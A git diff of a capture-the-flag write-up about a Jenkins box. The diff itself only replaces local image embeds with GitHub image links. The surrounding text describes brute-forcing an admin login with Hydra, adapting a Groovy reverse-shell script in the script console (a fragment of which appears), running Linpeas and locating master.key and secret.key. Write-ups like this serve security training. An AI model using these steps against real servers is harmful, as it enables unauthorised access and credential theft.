@@ -50,7 +50,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-17 17:04:
 
 ```
  And then I was able to get a password to login to the admin dashboard. From there I played around to see if there is anything. I enumerated....more like fuck around and find out. I then came across a script console that runs a groovy code
-![[Pasted image 20250217172236.png]]
+ 
+<img width="1920" height="690" alt="image" src="https://github.com/user-attachments/assets/db61eba4-6387-4699-bc7c-ee1e19ed9d99" />
+
 
 Then i decided to check if there are scripts online i can use to get reverse shell and I got something for windows but this jenkins was running on Linux so I edited the script to be able to work for linux and bankaiiiii we got a shell.
 
@@ -64,8 +66,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 The above code was used to get a shell. After getting a shell I moved around to get to see if i will be able to see the file in the home dir but I did not get anything so I decided to download Linpeas on it and run it. As we will have it, we have something about keys.
 
-![[Pasted image 20250217173714.png]]
+<img width="880" height="272" alt="image" src="https://github.com/user-attachments/assets/03e84fc6-535e-4bcf-9af5-5a39326d1b99" />
+
 
 We can see master.key and secret.key which might just lead us to something good.  And then we also have something which is looking like a flag hehe
 
-![[Pasted image 20250217173928.png]]
+<img width="756" height="125" alt="image" src="https://github.com/user-attachments/assets/356296da-ffdf-4e5d-91d9-5f0bee138430" />
+
